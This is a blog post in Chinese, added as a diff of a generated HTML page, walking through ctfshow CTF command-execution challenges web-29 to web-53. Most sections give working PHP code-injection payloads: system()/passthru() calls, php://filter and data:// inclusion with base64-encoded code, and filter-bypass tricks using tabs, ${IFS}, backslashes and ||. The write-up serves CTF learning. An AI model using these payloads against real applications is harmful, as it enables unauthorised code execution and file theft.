@@ -1,0 +1,279 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>ctfshow 命令执行 | 北歌</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"kinsey973.github.io","root":"/","title":"北沐城歌","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"填写邮箱，可以收到回复通知哦～"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="北歌" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-1LL0D86CY9');
+}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="web-命令执行web-29观察代码，发现过滤了flag，我们使用模糊匹配 ?c&#x3D;system(“cat fla*”); 就能得到flag了。   web-30观察代码可知，该题过滤了flag，system和php 我们可以使用passthru代替system ?c&#x3D;passthru(“cat fla*”);就能得到flag了   web-31观察代码，发现过滤了flag，sy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow 命令执行">
+<meta property="og:url" content="https://kinsey973.github.io/2024/10/08/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="北歌">
+<meta property="og:description" content="web-命令执行web-29观察代码，发现过滤了flag，我们使用模糊匹配 ?c&#x3D;system(“cat fla*”); 就能得到flag了。   web-30观察代码可知，该题过滤了flag，system和php 我们可以使用passthru代替system ?c&#x3D;passthru(“cat fla*”);就能得到flag了   web-31观察代码，发现过滤了flag，sy">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241625523.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241627224.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241646814.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241647646.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241857232.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241903101.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241909381.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241940177.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241940888.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404242059179.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404252023965.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/62340463ed224d4a9b05d03d80da2c72.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5LiAYXVl,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/28f9e75bfe0947e882d8e719947447b0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5LiAYXVl,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210831092105318.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210831092201573.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2024-10-08T12:11:50.000Z">
+<meta property="article:modified_time" content="2024-10-08T12:14:34.750Z">
+<meta property="article:author" content="kinsey">
+<meta property="article:tag" content="rce">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241625523.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">🌑</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">北歌</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">124</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">37</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">web-命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-29"><span class="toc-number">2.</span> <span class="toc-text">web-29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-30"><span class="toc-number">3.</span> <span class="toc-text">web-30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-31"><span class="toc-number">4.</span> <span class="toc-text">web-31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-32"><span class="toc-number">5.</span> <span class="toc-text">web-32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-33"><span class="toc-number">6.</span> <span class="toc-text">web-33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-34-36"><span class="toc-number">7.</span> <span class="toc-text">web-34-36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-37"><span class="toc-number">8.</span> <span class="toc-text">web-37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-38"><span class="toc-number">9.</span> <span class="toc-text">web-38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-39"><span class="toc-number">10.</span> <span class="toc-text">web-39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-40%EF%BC%88%E6%9A%82%E6%97%B6%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">web-40（暂时）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-41%EF%BC%88%E6%9A%82%E6%97%B6%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">web-41（暂时）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-42"><span class="toc-number">13.</span> <span class="toc-text">web-42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-43"><span class="toc-number">14.</span> <span class="toc-text">web-43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-44"><span class="toc-number">15.</span> <span class="toc-text">web-44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-45"><span class="toc-number">16.</span> <span class="toc-text">web-45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-46"><span class="toc-number">17.</span> <span class="toc-text">web-46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-47"><span class="toc-number">18.</span> <span class="toc-text">web-47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-48"><span class="toc-number">19.</span> <span class="toc-text">web-48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-49"><span class="toc-number">20.</span> <span class="toc-text">web-49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-50"><span class="toc-number">21.</span> <span class="toc-text">web-50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-51"><span class="toc-number">22.</span> <span class="toc-text">web-51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-52"><span class="toc-number">23.</span> <span class="toc-text">web-52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-53"><span class="toc-number">24.</span> <span class="toc-text">web-53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-54"><span class="toc-number">25.</span> <span class="toc-text">web-54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-55"><span class="toc-number">26.</span> <span class="toc-text">web-55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-56"><span class="toc-number">27.</span> <span class="toc-text">web 56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web57"><span class="toc-number">28.</span> <span class="toc-text">web57</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">28.1.</span> <span class="toc-text">知识点</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinsey973.github.io/2024/10/08/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="北歌"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ctfshow 命令执行<a class="post-edit-link" href="https://github.com/kinsey973/kinsey973.github.io/tree/master/2024/05/31/hello-world_posts/ctfshow-命令执行.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-10-08 20:11:50" itemprop="dateCreated datePublished" datetime="2024-10-08T20:11:50+08:00">2024-10-08</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">2.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">9m</span></span></span><span class="leancloud_visitors" id="/2024/10/08/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-flag-title="ctfshow 命令执行"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2024/10/08/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">学习笔记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/rce/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">rce</span></a><a class="tag-item" href="/tags/ctfshow/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ctfshow</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="web-命令执行"><a href="#web-命令执行" class="headerlink" title="web-命令执行"></a>web-命令执行</h3><h3 id="web-29"><a href="#web-29" class="headerlink" title="web-29"></a>web-29</h3><p>观察代码，发现过滤了flag，我们使用模糊匹配</p>
+<p>?c&#x3D;system(“cat fla*”);</p>
+<p>就能得到flag了。</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241625523.png" alt="image-20240424162512458" loading="lazy"></p>
+<hr>
+<h3 id="web-30"><a href="#web-30" class="headerlink" title="web-30"></a>web-30</h3><p>观察代码可知，该题过滤了flag，system和php</p>
+<p>我们可以使用passthru代替system</p>
+<p>?c&#x3D;passthru(“cat fla*”);就能得到flag了</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241627224.png" alt="image-20240424162720192" loading="lazy"></p>
+<hr>
+<h3 id="web-31"><a href="#web-31" class="headerlink" title="web-31"></a>web-31</h3><p>观察代码，发现过滤了flag，system，php，cat，sort，shell，.,空格，単引号，因此，我们可以进行重造</p>
+<p>变量</p>
+<p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘nl flag.php’);</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241646814.png" alt="image-20240424164628726" loading="lazy"></p>
+<p>页面回显1，说明重造成功，查看源码，发现flag</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241647646.png" alt="image-20240424164717613" loading="lazy"></p>
+<hr>
+<h3 id="web-32"><a href="#web-32" class="headerlink" title="web-32"></a>web-32</h3><p>观察代码，发现过滤了更多的东西</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241857232.png" alt="image-20240424185740157" loading="lazy"></p>
+<p>因此这题可以通过文件包含和变量覆盖来写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>$_GET[1]不加括号是因为，include把$__GET[1]当做一个变量来看，变量的内容由1来确定</p>
+<p>1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php是通过get请求传入的参数，内容是一个文件包含，以base64形式返回</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241903101.png" alt="image-20240424190343055" loading="lazy"></p>
+<p>flag在将base64解码就能看到了</p>
+<hr>
+<h3 id="web-33"><a href="#web-33" class="headerlink" title="web-33"></a>web-33</h3><p>观察代码，发现这道题比上一道题过滤了一样的东西，因此，这道题可以用上一题的题解写。</p>
+<p>但我们换种方法，我们使用data:&#x2F;&#x2F;伪协议</p>
+<p>payload：?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("nl%20flag.php");?></p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241909381.png" alt="image-20240424190935358" loading="lazy"></p>
+<p>页面回显1，说明代码成功执行，查看源码就能得到flag</p>
+<hr>
+<h3 id="web-34-36"><a href="#web-34-36" class="headerlink" title="web-34-36"></a>web-34-36</h3><p>跟前两个题做法一模一样</p>
+<hr>
+<h3 id="web-37"><a href="#web-37" class="headerlink" title="web-37"></a>web-37</h3><p>观察代码，发现一个include可知，该题需要使用文件包含，由于该题过滤了flag，它包含的数据流需转换成base64编码来改写</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241940177.png" alt="image-20240424194040157" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>flag在源码里</p>
+<p>注意：当data:&#x2F;&#x2F;text&#x2F;plain后面接的不是base64编码，就使用逗号隔开</p>
+<p>​			当data:&#x2F;&#x2F;text&#x2F;plain后面为base64编码，就要使用分号隔开，再加上base64和base64编码</p>
+<hr>
+<h3 id="web-38"><a href="#web-38" class="headerlink" title="web-38"></a>web-38</h3><p>在上题的基础上过滤了php和file，我们依旧使用上一题的payload就能得到flag</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241940888.png" alt="image-20240424194006862" loading="lazy"></p>
+<hr>
+<h3 id="web-39"><a href="#web-39" class="headerlink" title="web-39"></a>web-39</h3><p>查看源码，发现$c后面拼接了.php，拼接的php可以不用管,include只会处理内部的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=data://text/plain,&lt;?php%20system(&quot;cat%20fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-40（暂时）"><a href="#web-40（暂时）" class="headerlink" title="web-40（暂时）"></a>web-40（暂时）</h3><p>不懂</p>
+<p>payload：echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
+<p>payload：show_source(next(array_reverse(scandir(pos(localeconv()))))); </p>
+<hr>
+<h3 id="web-41（暂时）"><a href="#web-41（暂时）" class="headerlink" title="web-41（暂时）"></a>web-41（暂时）</h3><p>用脚本写，暂时不会</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p>
+<hr>
+<h3 id="web-42"><a href="#web-42" class="headerlink" title="web-42"></a>web-42</h3><p>查看源码，发现eval里有个&#x2F;dev&#x2F;null 2&gt;&amp;1</p>
+<p>&#x2F;dev&#x2F;null 2&gt;&amp;1：让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
+<p>所以我们不能让后面执行，需要把后面截断，我们使用**%0a(换行),%26（&amp;）,||**</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=cat flag.php %26</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404242059179.png" alt="image-20240424205927150" loading="lazy"></p>
+<hr>
+<h3 id="web-43"><a href="#web-43" class="headerlink" title="web-43"></a>web-43</h3><p>相对上一题，过滤了cat，我们使用tac来代替cat，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=tac flag.php %26</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-44"><a href="#web-44" class="headerlink" title="web-44"></a>web-44</h3><p>这题跟上题类似，但过滤了flag，因此我们构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac f\lag%0a</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-45"><a href="#web-45" class="headerlink" title="web-45"></a>web-45</h3><p>多过滤了一个空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylo?c=tac%09fl*%26</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-46"><a href="#web-46" class="headerlink" title="web-46"></a>web-46</h3><p>该题过滤了空格和0-9，$,*,因此这题就不能使用url编码了，但我们可以使用||绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=tac&lt;fl\ag.php||</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-47"><a href="#web-47" class="headerlink" title="web-47"></a>web-47</h3><p>这道题过滤了更多的文件读取命令，但还是没有过滤tac，因此</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=tac&lt;fl\ag.php||</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-48"><a href="#web-48" class="headerlink" title="web-48"></a>web-48</h3><p>额，这题依旧没过滤tac</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=tac&lt;fl\ag.php||</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-49"><a href="#web-49" class="headerlink" title="web-49"></a>web-49</h3><p>嗯，依旧没过滤</p>
+<p>页面进行get请求时都会进行url解码再传参的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload1:c=nl%09fla\g.php||</span><br><span class="line">payload2:c=nl%09fla\g.php%0a</span><br><span class="line">payload3:c=nl%09fla&#x27;&#x27;g.php%0a</span><br><span class="line">payload4:c=nl%09fla&quot;&quot;g.php%0a</span><br><span class="line">payload5:c=vi%09fla\g.php%0a</span><br><span class="line">payload6:c=tac%09fla\g.php%0a</span><br><span class="line">payload7:c=uniq%09fla\g.php%0a</span><br><span class="line">payload8:c=nl&lt;fla&#x27;&#x27;g.php||</span><br><span class="line">payload9:c=nl%09fla\g.php%26</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-50"><a href="#web-50" class="headerlink" title="web-50"></a>web-50</h3><p>我们依旧可以用tac来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=tac&lt;fl\ag.php||</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-51"><a href="#web-51" class="headerlink" title="web-51"></a>web-51</h3><p>这题把tac过滤了，我们可以使用nl来进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl\ag.php||</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-52"><a href="#web-52" class="headerlink" title="web-52"></a>web-52</h3><p>这道题的&lt;和&gt;被过滤了，但$没有被过滤，我们可以使用${IFS}来代替空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?c=nl$&#123;IFS&#125;fl\ag.php</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-53"><a href="#web-53" class="headerlink" title="web-53"></a>web-53</h3><p>跟上题做法一样</p>
